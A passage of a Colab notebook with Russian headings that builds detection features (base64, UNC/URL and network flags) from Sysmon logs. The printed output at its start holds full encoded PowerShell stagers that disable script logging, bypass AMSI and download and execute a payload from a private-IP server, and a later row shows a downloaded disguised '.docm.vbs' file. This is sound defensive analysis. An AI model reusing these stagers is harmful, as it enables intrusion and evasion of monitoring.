qADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAHcAQwAuAEgAZQBhAGQAZQBSAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AFMATQBMAFgAVwBRAGIAaQBFADMAWgAvAE4ARABHAHEATAB1ADgAVAA5AEUAdABCAHIARABRAD0AIgApADsAJABEAEEAdABhAD0AJABXAEMALgBEAE8AVwBuAGwAbwBBAEQARABhAFQAQQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQBWAD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABBAD0AJABkAEEAdABBAFsANAAuAC4AJABkAEEAVABhAC4AbABFAE4AZwB0AEgAXQA7AC0AagBvAGkAbgBbAEMAaABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA= \n",
            "\n",
            "-noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAUwBpAE8ATgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBJAG8ATgAuAE0AQQBqAG8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAEUATQBiAEwAeQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEATABVAGUAKAAkAG4AVQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8ATABMAGUAQwB0AGkAbwBOAHMALgBHAGUAbgBlAFIASQBDAC4ARABJAEMAVABpAG8AbgBhAHIAWQBbAFMAVAByAGkAbgBnACwAUwB5AFMAVABlAE0ALgBPAGIASgBlAEMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAVgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABzAEUAewBbAFMAYwByAGkAUAB0AEIATABPAGMASwBdAC4AIgBHAGUAdABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBlACgAJABuAFUATABsACwAKABOAGUAVwAtAE8AYgBqAGUAYwBUACAAQwBvAEwAbABFAEMAdABpAE8AbgBzAC4ARwBlAG4AZQBSAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBpAE4ARwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBiAGwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBMAEwALAAkAFQAUgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAVABFAG0ALgBOAEUAdAAuAFMAZQByAFYASQBjAEUAUABvAGkAbgB0AE0AQQBOAGEARwBFAFIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AVABpAG4AdQBFAD0AMAA7ACQAdwBDAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAeQBzAFQARQBtAC4ATgBFAHQALgBXAEUAQgBDAGwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAFgAWQA9AFsAUwBZAHMAVABFAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAHUAZQBzAFQAXQA6ADoARABlAGYAYQBVAGwAVABXAGUAQgBQAHIATwB4AFkAOwAkAHcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBuAFQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAEUATgB0AGkAYQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBBAFUAbABUAE4AZQBUAHcAbwByAEsAQwByAGUARABFAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAE0ALgBUAEUAeABUAC4ARQBuAEMAbwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAeQB0AEUAcwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBqAHMAagBkAG0AMABoAE4AagBIAHgAYgBaAEcASABrAGEAeQBpACsAcgBOAFkAYwBKAFYAcwA9ACIAKQA7ACQARABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBsAG8AQQBEAEQAYQBUAGEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAQQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABBAHQAQQAuAEwARQBOAGcAVABoAF0AOwAtAEoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA \n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "b64s = newdf['arguments'].apply(lambda x: re.search(b64_regex, x)).notnull()\n",
        "newdf['b64'] = b64s.astype(int)"
      ],
      "metadata": {
        "id": "3197zC-afXu2"
      },
      "execution_count": 18,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "4. URL / UNC"
      ],
      "metadata": {
        "id": "VEWIpdqSfmAU"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "unc_regex = r\"\\\\\\\\[a-zA-Z0-9]+\\\\[a-zA-Z0-9\\\\]+\\.\"\n",
        "uncs = newdf['arguments'][newdf['arguments'].apply(lambda x: re.search(unc_regex, x)).notnull()]\n",
        "uncs[uncs].index"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "L3TuaQfFflwv",
        "outputId": "d06f678d-4817-46c2-8bf4-ddcd05787aac"
      },
      "execution_count": 19,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Int64Index([], dtype='int64')"
            ]
          },
          "metadata": {},
          "execution_count": 19
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "test = r\"rundll \\\\test\\test\\r.dll\"\n",
        "re.search(unc_regex, test)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ZDXcjy3yfjkz",
        "outputId": "251cb627-84ee-4653-e2d2-4cceb6a11f1c"
      },
      "execution_count": 20,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<re.Match object; span=(7, 21), match='\\\\\\\\test\\\\test\\\\r.'>"
            ]
          },
          "metadata": {},
          "execution_count": 20
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "url_regex = r\"https?:\\/\\/(www\\.)?[-a-zA-Z0-9@:%._\\+~#=]{1,256}\\.[a-zA-Z0-9()]{1,6}\\b([-a-zA-Z0-9()@:%_\\+.~#?&//=]*)\"\n",
        "urls = newdf['arguments'].apply(lambda x: re.search(url_regex, x)).notnull()\n",
        "urls[urls]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "quNlCfZFfy9s",
        "outputId": "cf98afb8-21f2-4d35-ba1e-1619a374cc56"
      },
      "execution_count": 21,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "3507    True\n",
              "Name: arguments, dtype: bool"
            ]
          },
          "metadata": {},
          "execution_count": 21
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['arguments'][3507]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 54
        },
        "id": "_g432QG9f2Lz",
        "outputId": "a642adf9-acf2-48a4-849d-f4cc36a5587a"
      },
      "execution_count": 22,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'-IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe|C:\\\\Users\\\\anon\\\\Downloads\\\\quarterly_results.docm.vbs|http://192.168.124.135/quarterly_results.docm.vbs'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 22
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['unc_url'] = pd.concat([uncs, urls]).astype(int)"
      ],
      "metadata": {
        "id": "Fp8UkuTtf8uA"
      },
      "execution_count": 23,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "newdf[newdf['unc_url'].astype(bool)]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 187
        },
        "id": "vUWs9dXKgBJE",
        "outputId": "f2f9fd48-7713-4570-a4b7-ed5587a73781"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "      Unnamed: 0                  UtcTime  ProcessId  EventID  \\\n",
              "3507        3567  2020-05-12 14:53:21.922       9444        1   \n",
              "\n",
              "                      User                                   Image  \\\n",
              "3507  DESKTOP-TATBGQH\\anon  C:\\Windows\\System32\\browser_broker.exe   \n",
              "\n",
              "     ImageLoaded                                        CommandLine  \\\n",
              "3507         NaN  C:\\Windows\\system32\\browser_broker.exe -IOAVHo...   \n",
              "\n",
              "                                 ParentImage  \\\n",
              "3507  C:\\Windows\\System32\\browser_broker.exe   \n",
              "\n",
              "                                      ParentCommandLine  DestinationPort  \\\n",
              "3507  C:\\Windows\\system32\\browser_broker.exe -Embedding              NaN   \n",
              "\n",
              "     Protocol QueryName TargetFilename TargetObject              binary  \\\n",
              "3507      NaN       NaN            NaN          NaN  browser_broker.exe   \n",
              "\n",
              "                     path                                          arguments  \\\n",
              "3507  c:\\windows\\system32  -IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe...   \n",
              "\n",
              "      b64  unc_url  \n",
              "3507    0        1  "
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-50dc8398-a336-4223-9d59-805d1bae112c\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>Unnamed: 0</th>\n",
              "      <th>UtcTime</th>\n",
              "      <th>ProcessId</th>\n",
              "      <th>EventID</th>\n",
              "      <th>User</th>\n",
              "      <th>Image</th>\n",
              "      <th>ImageLoaded</th>\n",
              "      <th>CommandLine</th>\n",
              "      <th>ParentImage</th>\n",
              "      <th>ParentCommandLine</th>\n",
              "      <th>DestinationPort</th>\n",
              "      <th>Protocol</th>\n",
              "      <th>QueryName</th>\n",
              "      <th>TargetFilename</th>\n",
              "      <th>TargetObject</th>\n",
              "      <th>binary</th>\n",
              "      <th>path</th>\n",
              "      <th>arguments</th>\n",
              "      <th>b64</th>\n",
              "      <th>unc_url</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>3507</th>\n",
              "      <td>3567</td>\n",
              "      <td>2020-05-12 14:53:21.922</td>\n",
              "      <td>9444</td>\n",
              "      <td>1</td>\n",
              "      <td>DESKTOP-TATBGQH\\anon</td>\n",
              "      <td>C:\\Windows\\System32\\browser_broker.exe</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\system32\\browser_broker.exe -IOAVHo...</td>\n",
              "      <td>C:\\Windows\\System32\\browser_broker.exe</td>\n",
              "      <td>C:\\Windows\\system32\\browser_broker.exe -Embedding</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>browser_broker.exe</td>\n",
              "      <td>c:\\windows\\system32</td>\n",
              "      <td>-IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe...</td>\n",
              "      <td>0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-50dc8398-a336-4223-9d59-805d1bae112c')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-50dc8398-a336-4223-9d59-805d1bae112c button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-50dc8398-a336-4223-9d59-805d1bae112c');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "<div id=\"df-1147b1b4-f98f-417d-b26c-3f547cfe0d1e\">\n",
              "  <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-1147b1b4-f98f-417d-b26c-3f547cfe0d1e')\"\n",
              "            title=\"Suggest charts.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "  </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "    background-color: #E8F0FE;\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: #1967D2;\n",
              "    height: 32px;\n",
              "    padding: 0 0 0 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: #E2EBFA;\n",
              "    box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: #174EA6;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "    background-color: #3B4455;\n",
              "    fill: #D2E3FC;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart:hover {\n",
              "    background-color: #434B5C;\n",
              "    box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "    filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "    fill: #FFFFFF;\n",
              "  }\n",
              "</style>\n",
              "\n",
              "  <script>\n",
              "    async function quickchart(key) {\n",
              "      const charts = await google.colab.kernel.invokeFunction(\n",
              "          'suggestCharts', [key], {});\n",
              "    }\n",
              "    (() => {\n",
              "      let quickchartButtonEl =\n",
              "        document.querySelector('#df-1147b1b4-f98f-417d-b26c-3f547cfe0d1e button');\n",
              "      quickchartButtonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "    })();\n",
              "  </script>\n",
              "</div>\n",
              "    </div>\n",
              "  </div>\n"
            ]
          },
          "metadata": {},
          "execution_count": 24
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "5.  Сетевые обращения?"
      ],
      "metadata": {
        "id": "8HH2XQ-ngLC9"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['network'] = newdf['Protocol'].notnull().astype(int)\n"
      ],
      "metadata": {
        "id": "R7vciuOXgJL0"
      },
      "execution_count": 25,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Объединяем в новый DataFrame**"
      ],
      "metadata": {
        "id": "vDVjbxhZM7K1"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "newdf = newdf[['ProcessId','binary','EventID','path', 'unc_url', 'b64', 'network']]\n",
        "newdf['EventID'] = newdf['EventID'].astype('int8')\n",
        "newdf.head()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 334
        },
        "id": "kwUym4lggTma",
        "outputId": "cc7ea37c-df2f-4344-9574-95907f0ae7e2"
      },
      "execution_count": 26,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-26-c370b2c67227>:2: SettingWithCopyWarning: \n",
            "A value is trying to be set on a copy of a slice from a DataFrame.\n",
            "Try using .loc[row_indexer,col_indexer] = value instead\n",
            "\n",
            "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
            "  newdf['EventID'] = newdf['EventID'].astype('int8')\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "   ProcessId          binary  EventID  \\\n",
              "0       5380    explorer.exe        7   \n",
              "1       5380    explorer.exe       11   \n",
              "2       5080         mmc.exe       11   \n",
              "3       1520  powershell.exe        3   \n",
              "4          4          system        3   \n",
              "\n",
              "                                         path  unc_url  b64  network  \n",
              "0                                  c:\\windows        0    0        0  \n",
              "1                                  c:\\windows        0    0        0  \n",
              "2                         c:\\windows\\system32        0    0        0  \n",
              "3  c:\\windows\\system32\\windowspowershell\\v1.0        0    0        1  \n",
              "4                                                    0    0        1  "
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-59cdd696-fe5a-4502-9c20-486073bc2fb6\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>ProcessId</th>\n",
              "      <th>binary</th>\n",
              "      <th>EventID</th>\n",
              "      <th>path</th>\n",
              "      <th>unc_url</th>\n",
              "      <th>b64</th>\n",
              "      <th>network</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>5380</td>\n",
              "      <td>explorer.exe</td>\n",
              "      <td>7</td>\n",
              "      <td>c:\\windows</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>5380</td>\n",
              "      <td>explorer.exe</td>\n",
              "      <td>11</td>\n",
              "      <td>c:\\windows</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>5080</td>\n",
              "      <td>mmc.exe</td>\n",
              "      <td>11</td>\n",
              "      <td>c:\\windows\\system32</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>1520</td>\n",
              "      <td>powershell.exe</td>\n",
              "      <td>3</td>\n",
              "      <td>c:\\windows\\system32\\windowspowershell\\v1.0</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>4</td>\n",
              "      <td>system</td>\n",
              "      <td>3</td>\n",
              "      <td></td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-59cdd696-fe5a-4502-9c20-486073bc2fb6')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
